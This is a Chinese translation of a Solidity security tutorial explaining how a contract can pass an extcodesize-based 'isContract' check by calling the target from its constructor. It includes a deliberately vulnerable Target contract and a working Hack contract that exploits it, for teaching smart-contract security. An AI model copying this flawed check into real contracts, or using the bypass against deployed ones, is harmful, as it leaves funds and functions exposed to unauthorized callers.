# 绕过合约大小检查

对应英文原页：https://solidity-by-example.org/hacks/contract-size

## 漏洞

如果一个地址是合约，那么存储在该地址的代码大小就会大于 0，对吗？

让我们看看如何创建一个由 `extcodesize` 返回的代码大小等于 0 的合约。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

contract Target {
    function isContract(address account) public view returns (bool) {
        // 该方法依赖 extcodesize，它在合约构造过程中会返回 0，
        // 因为代码只在构造函数执行结束时才被存储。
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    bool public pwned = false;

    function protected() external {
        require(!isContract(msg.sender), "no contract allowed");
        pwned = true;
    }
}

contract FailedAttack {
    // 尝试调用 Target.protected 会失败，
    // Target 会阻止来自合约的调用
    function pwn(address _target) external {
        // 这将会失败
        Target(_target).protected();
    }
}

contract Hack {
    bool public isContract;
    address public addr;

    // 合约正在被创建时，代码大小（extcodesize）为 0。
    // 这将绕过 isContract() 检查
    constructor(address _target) {
        isContract = Target(_target).isContract(address(this));
        addr = address(this);
        // 这将成功
        Target(_target).protected();
    }
}
```

---
## 关注我们
[Yanbo的Twitter](https://twitter.com/YanboOfficial)｜[Web3Club的Twitter](https://twitter.com/Web3ClubCN)

加入Web3Club 官方讨论群：YanboTravelAllWorld（微信号）

[加入我们](https://github.com/Web3-Club/Intro./blob/main/Join%20club.md)
